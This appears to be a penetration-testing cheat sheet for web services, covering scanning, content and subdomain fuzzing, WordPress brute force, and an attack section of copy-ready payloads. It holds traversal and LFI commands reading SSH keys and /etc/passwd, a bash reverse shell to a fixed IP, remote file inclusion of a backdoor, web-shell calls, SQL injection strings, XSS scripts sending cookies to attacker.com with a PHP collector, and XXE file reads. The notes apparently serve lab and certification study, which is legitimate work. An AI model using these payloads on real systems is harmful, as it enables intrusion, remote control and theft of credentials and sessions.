---
title: 80,443 HTTP/HTTPS
parent: Services
grand_parent: Red Team
nav_order: 80
---
# HTTP / HTTPS

---

## Default Port

- 80
- 443
- 8000 (python)

---

## Service Info

Web service used to host applications and APIs.
Commonly exposes misconfigurations, sensitive files, and injection points.

---

## Common security issues

- Exposed admin panels
- Directory listing enabled
- Misconfigured file upload
- Injection vulnerabilities (SQL / XSS / RCE)
- Sensitive files (.env, backups, configs)

---

# *Scan*

---

## Banner / Vulnerability Scan 

```zsh
nmap -Pn -p80 -sCV -A -oN 80_sCVA <IP> --min-rate=5000
```
- -sCV
- -A 
- --min-rate=5000 

## auto scan
### [Nessus]()

### [nuclei]()

```bash
nuclei -target http://192.168.121.16
```

### [Kiterunner]()

```zsh
kr scan http://localhost:8080 -A raft-small-words
```


---

# *Enumeration & Discovery*

---

# Basic Infomation

## on browser
- view page source
- Wappalyzer
- comment out
- robots.txt

```bash
whatweb -a 3 http://<IP>
```

```bash
curl -I -sK http://<IP>
```

👉 Identify:
* Server
* Framework
* Technologies
* CMS (WordPress, Joomla, etc.)
* Backend language (PHP, ASP, Node)

## keywords gathering
### e-mail address

```zsh
cewl http://192.168.155.145 -e -n -w email.txt
```


---

#  Web Content Discovery

## Important Files by Web Server


<details markdown="1">
<summary>PHP (Apache / nginx + PHP-FPM)</summary>

### Extension Explanation

| Extension           | Description                        |
| ------------------- | ---------------------------------- |
| `.php`              | Standard PHP application files     |
| `.phtml`            | Alternative PHP template extension |
| `.php3/.php4/.php5` | Legacy PHP versions                |
| `.phps`             | PHP source highlighting files      |
| `.inc`              | Include files                      |
| `.env`              | Environment secrets                |
| `.ini`              | Configuration files                |
| `.sql`              | Database dumps                     |
| `.sqlite3`          | SQLite databases                   |
| `.log`              | Log files                          |

</details>

<details markdown="1">
<summary>ASP.NET / IIS</summary>

### Extension Explanation

| Extension | Description                 |
| --------- | --------------------------- |
| `.aspx`   | ASP.NET web pages           |
| `.asmx`   | Legacy ASP.NET web services |
| `.ashx`   | HTTP handlers               |
| `.svc`    | WCF endpoints               |
| `.config` | IIS/application configs     |
| `.cshtml` | Razor templates             |
| `.master` | Master pages                |
| `.cs`     | C# source                   |
| `.vb`     | VB.NET source               |

</details>

<details markdown="1">
<summary>Java (Tomcat / Spring / JBoss)</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.jsp` | Java Server Pages |
| `.jspx` | XML-based JSP pages |
| `.do` | Apache Struts actions |
| `.action` | MVC action routes |
| `.war` | Java web archives |
| `.properties` | Configuration files |
| `.xml` | Application configuration |
| `.jar` | Java libraries |

</details>

<details markdown="1">
<summary>Python (Django / Flask)</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.py` | Python source files |
| `.pyc` | Compiled Python bytecode |
| `.wsgi` | WSGI application entrypoint |
| `.sqlite3` | SQLite database files |
| `.yaml/.yml` | YAML configuration |
| `.cfg/.ini` | Configuration files |
| `.env` | Environment secrets |

</details>

<details markdown="1">

<summary>Node.js / Express</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.js` | JavaScript application files |
| `.json` | Configuration/API responses |
| `.map` | Source maps |
| `.npmrc` | NPM configuration |
| `.env` | Environment secrets |
| `package-lock.json` | Dependency metadata |

</details>

<details markdown="1">
<summary>Ruby on Rails</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.rb` | Ruby source files |
| `.erb` | Embedded Ruby templates |
| `.rhtml` | Legacy Rails templates |
| `.yml/.yaml` | Rails configuration files |
| `database.yml` | Database credentials/configuration |

</details>

<details markdown="1">
<summary>Go Web Applications</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.go` | Go source files |
| `.tpl/.tmpl` | Template files |
| `.toml` | Application configuration files |
| `.yaml/.yml` | Service configuration |
| `.env` | Environment secrets |

</details>

<details markdown="1">
<summary>Generic Sensitive Extensions</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.bak` | Backup copies |
| `.old` | Old application versions |
| `.save` | Saved backup files |
| `.swp` | Vim swap files |
| `.tmp` | Temporary files |
| `.orig` | Original file backups |
| `~` | Editor backup files |
| `.zip/.tar/.gz/.7z` | Archive files |

</details>

<details markdown="1">
<summary>Generic Sensitive FIlenames</summary>

### Filename Explanation

| Filename | Description |
|---|---|
| `.env` | Environment secrets |
| `.git/config` | Git repository configuration |
| `.htaccess` | Apache access configuration |
| `.htpasswd` | Apache password file |
| `.web.config` | IIS configuration |
| `backup.zip` | Archived backups |
| `db.sql` | Database dumps |

</details>


<details markdown="1">
<summary>feroxbuster</summary>
## feroxbuster

```zsh
feroxbuster \
-u http://target \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

Option	Description

- -u	Target URL
- -w	Wordlist path
- -x	File extensions to test
- -d 2	Recursion depth
- -t 25	Concurrent threads
- -r	Follow redirects
- --random-agent	Use random User-Agent
- -C 403,404	Filter HTTP 403,404 responses
- -o	Output file

### skip directory

```zsh
feroxbuster -u http://target.local --dont-scan admin uploads backup
```
- --dont-scan

</details>


<details markdown="1">
<summary>ffuf</summary>
## ffuf

```zsh
ffuf \
-u http://target/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-e .php,.txt,.bak,.zip,.old \
-recursion \
-recursion-depth 2 \
-t 25 \
-rate 50 \
-ac \
-r \
-H "User-Agent: Mozilla/5.0" \
-o ffuf.json \
-of json
```

Option	Description

- -u	Target URL with FUZZ keyword
- -w	Wordlist path
- -e	File extensions to append
- -recursion	Enable recursive scanning
- -recursion-depth 2	Maximum recursion depth
- -t 25	Concurrent threads
- -rate 50	Requests per second
- -ac	Auto-calibration filtering
- -r	Follow redirects
- -H	Custom HTTP header
- -o	Output file
- -of json	Output format

</details>


<details markdown="1">
<summary>gobuster</summary>
## gobuster

```zsh
gobuster dir \
-u http://target \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-x php,txt,bak,zip,old \
-t 25 \
-k \
-r \
--random-agent \
-b 403,404 \
-o gobuster.txt
```

Option	Description
- dir	Directory brute force mode
- -u	Target URL
- -w	Wordlist path
- -x	File extensions to test
- -t 25	Concurrent threads
- -k	Skip TLS verification
- -r	Follow redirects
- --random-agent	Randomize User-Agent
- -b 403,404	Exclude HTTP 403,404 responses
- -o	Output file



<details markdown="1">
<summary>dirb</summary>
## dirb

```zsh
dirb http://target \
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-X .php,.txt,.bak,.zip,.old \
-z 50
Option Explanation
Option	Description
-X	File extensions to append
-z 50	Delay requests by 50ms
```

DIRB performs recursive scanning by default.

</details>


<details markdown="1">
<summary>dirbuster</summary>
## DirBuster

Recommended Configuration (GUI)
Setting	Value
- Wordlist	raft-large-directories.txt
- File Extensions	php, txt, bak, zip, old
- Threads	25
- Recursive Scanning	Enabled
- Detect 403,404 Responses	Enabled
- Random User Agents	Enabled
- Recommended Wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

![](../../assets/images/Pasted%20image%2020260512192606.png)

Source:
https://github.com/danielmiessler/SecLists?utm_source=chatgpt.com

</details>

---

# Subdomain & VHOST Discovery
## feroxbuster

feroxbuster is primarily designed for content discovery and does not provide native DNS subdomain enumeration or VHOST fuzzing features.

Common Workflow

Use another tool such as:

ffuf
gobuster

for:

DNS subdomain enumeration
Virtual host discovery
## ffuf
### Subdomain Discovery

```zsh
ffuf \
-u http://target \
-H "Host: FUZZ.target" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-t 25 \
-rate 50 \
-ac \
-fs 0 \
-H "User-Agent: Mozilla/5.0" \
-o ffuf_subdomains.json \
-of json
```

Option	Description
- -u	Base target URL 
- -H "Host: FUZZ.target"	Inject fuzzed subdomain into Host header
- -w	Wordlist path
- -t 25	Concurrent threads
- -rate 50	Requests per second
- -ac	Auto-calibration filtering
- -fs 0	Filter empty responses
- -H	Custom HTTP header
- -o	Output file
- -of json	Output format

### VHOST Discovery

```zsh
ffuf \
-u http://target \
-H "Host: FUZZ.target" \
-w /usr/share/seclists/Discovery/DNS/namelist.txt \
-t 25 \
-rate 50 \
-ac \
-H "User-Agent: Mozilla/5.0" \
-o ffuf_vhosts.json \
-of json
```

Option	Description
- -H "Host: FUZZ.target"	Fuzz virtual host names
- -ac	Automatically filter wildcard responses
- -rate 50	Rate limit requests
- -t 25	Concurrent threads

## gobuster

### Subdomain Discovery

```zsh
gobuster dns \
-d target \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-t 25 \
-i \
-o gobuster_subdomains.txt
```


Option	Description

- dns	DNS enumeration mode
- -d	Target domain
- -w	Wordlist path
- -t 25	Concurrent threads
- -i	Show IP addresses
- -o	Output file

### VHOST Discovery

```zsh
gobuster vhost \
-u http://target \
-w /usr/share/seclists/Discovery/DNS/namelist.txt \
-t 25 \
-k \
-r \
--append-domain \
-o gobuster_vhosts.txt
```

Option	Description
- vhost	Virtual host fuzzing mode
- -u	Target URL
- -w	Wordlist path
- -t 25	Concurrent threads
- -k	Skip TLS verification
- -r	Follow redirects
- --append-domain	Append base domain automatically
- -o	Output file

---

# Parameter Discovery

```zsh
ffuf -u 'http://192.168.11.21/test.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 80
```
- -u URL
- -w wordlist
- -fs 

👉 Find hidden parameters

---

# CMS-Specific

### WordPress
#### [2_wpscan](../tools/web_scan/cms/2_wpscan.md)
```bash
wpscan --url http://192.168.201.239/ --enumerate vp,u,vt,tt --verbose
```

```zsh
wpscan --url http://192.168.201.239/ --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd,hugo,philip
```
#### [3_wpprobe](../tools/web_scan/cms/3_wpprobe.md)
```zsh
wpprobe scan -u http://192.168.147.123/wordpress -v
```

```shell
wpprobe scan -f targets.txt -t 20 -o results.json
```

👉 If login success:
→ [WordPress_PHP](../weaponization/Generate_ReverseShell/WordPress_PHP) 
### Joomla 

[4_joomscan](../tools/web_scan/cms/4_joomscan.md)
```bash
joomscan -u http://localhost/
```

### Drupal
### Scan
```bash
droopescan scan drupal -u http://192.168.0.101
```

</details>

---

# *Attack*

---

<details markdown="1">
<summary>Directory Traversal</summary>

```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

</details>

---

<details markdown="1">
<summary>LFI</summary>

```bash
http://<IP>/index.php?page=../../../../etc/passwd
```

```bash
curl http://<IP>/index.php?file=../../../../home/user/.ssh/id_rsa
```
If vulnerable → read files / get creds

#### Example:
- [Executing a Command](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
- [Log Poisoning](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)

---

# Handling Spaces in Commands

If the command you are sending contains spaces, as shown below, an error may occur.
```bash
ls -la
cat /etc/passwd
```

## Solution
Use IFS to change how spaces are interpreted
```bash
IFS=‘ ’  # Set IFS to space
input="cat /etc/passwd"

read -r cmd arg <<< “$input”
$cmd $arg
```
In the example above, spaces are interpreted as %20
```bash
curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/apache2/access.log/?cmd=ls%20-ls HTTP/1.1
```

</details>

---


<details markdown="1">
<summary>RFI</summary>

```bash
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
```
If vulnerable → [reverseshell](../weaponization/reverseshell.md)

```zsh
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
```
#### Example:
- [ RFI Using an Existing Web Shell File](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
-  [Using Pentestmonkey](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
 [5_php_wrapper](../tools/5_php_wrapper.md)
*By using a wrapper, it is possible to bypass filters in PHP web applications or execute code by exploiting file inclusion vulnerabilities.*

</details>

---


<details markdown="1">
<summary>Command Injection</summary>

```bash
; id
```

```zsh
&& whoami
```

```bash
"; /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' ; #"
```
→ If vulnerable → [Reverse Shell](../03_initial_access/reverse_shell.md)

#### Example:
-  [git command](../99_attack_repo/01-50_web/01_web_command-injection_git.md)

</details>

---

<details markdown="1">
<summary>File Upload</summary>
# File Upload

```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

#### Example:
- [Create Powershell Oneliner](../99_attack_repo/01-50_web/web_fileupload.md)
- [If you can't use nc](../99_attack_repo/01-50_web/web_fileupload.md)
- [If there are restrictions on uploading ASP and ASPX files](https://github.com/yangbaopeng/ashx_webshell)
- [Using Non-Executable Files]()

👉 Try:

* `.php`
* extension spoofing(`.pHP`)
* double extension (`shell.php.jpg`)
* MIME bypass

→ If success → execute shell

</details>

---


<details markdown="1">
<summary>SQL Injection</summary>
#### Validity Check
Enter `‘ or '1’='1';--` and use a tool such as **BurpSuite** to check if the behavior differs from that of a normal input.

```zsh
admin' or '1'='1
```

```zsh
'or '1'='1 --
```

```
`"or "1"="1`
```

```
"or "1"="1" --
```

```
") or "1"="1 --`
```

```
"or 1=1 --
```

```zsh
kevin' OR 1=1 -- //
```

```
' or 1=1 in (select @@version) -- //
```

```
' OR 1=1 in (SELECT * FROM users) -- //
```

```
' or 1=1 in (SELECT password FROM users) -- //
```

```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

#### Determining the number of columns

```bash
' union select null, null, null, null, null;--
```

```bash
' or 1=1 order by 10 #
```

## sqlmap

| option | Description | Example |
| -u | URL | `sqlmap -u http://10.10.10.1/` |
| --batch | Disable interactive mode | `sqlmap -u URL --batch` |
| -dbs | Retrieve available database names | `sqlmap -u URL --dbs` |
| --tables | table list | `sqlmap -u URL -D --tables` |
| --dump | culm list | `sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump` |
| --all | Retrieve all information | `sqlmap -u URL --all` |

```bash
sqlmap -u "http://<IP>/index.php?id=1" --dump --batch
```

```bash
sqlmap -r site.txt --dump --batch
```

##### Example:
MSSQL

```zsh
sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t --risk 3 --level 5 --batch
```

</details>

---

<details markdown="1">
<summary>XSS</summary>

#### Basic Syntax

```xml
<script>alert(‘XSS’);</script>
```

## Image File Format

```xml
<script>
new Image().src = ‘http://attacker.com/steal?c=’ + document.cookie;
</script>
```

## Sending with Parameters

```xml
<script>
location.href=‘http://attacker.com/log?cookie=’+document.cookie
</script>
```

```xml
<script>
fetch(‘http://attacker.com/log?cookie=’ + encodeURIComponent(document.cookie));
</script>
```

## The server-side processing (`steal.php`) that allows the attacker to receive the cookie is as follows
```php
<?php 
file_put_contents(‘cookies.txt’, $_GET[‘c’] . “\n”, FILE_APPEND); 
?>
```

</details>

---


<details markdown="1">
<summary>XXE</summary>
#### Example:
#### read /etc/passwd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
```
![](../../assets/images/Pasted%20image%2020260507093552.png)

#### read .bashrc

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">]>
<root>
<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
```
![](../../assets/images/Pasted%20image%2020260507093608.png)

</details>

---

Next

---

## Credentials Found?

👉 If yes:

* Try login panels
* Reuse for:

  * [SSH](ssh.md)
  * [SMB](smb.md)
  * [WinRM](winrm.md)

---

# Webshell

### predater

### Shell Obtained?

👉 If yes:

→ [Linux Privilege Escalation](../04_priv_esc/linux.md)

→ [Windows Privilege Escalation](../04_priv_esc/windows.md)

or

Lateral Movement / Pivot
- [ligolo](../05_pivot/ligolo.md)
- [chisel](../05_pivot/chisel.md)
- [ssh-tunnel](../05_pivot/ssh_tunnel.md)
---

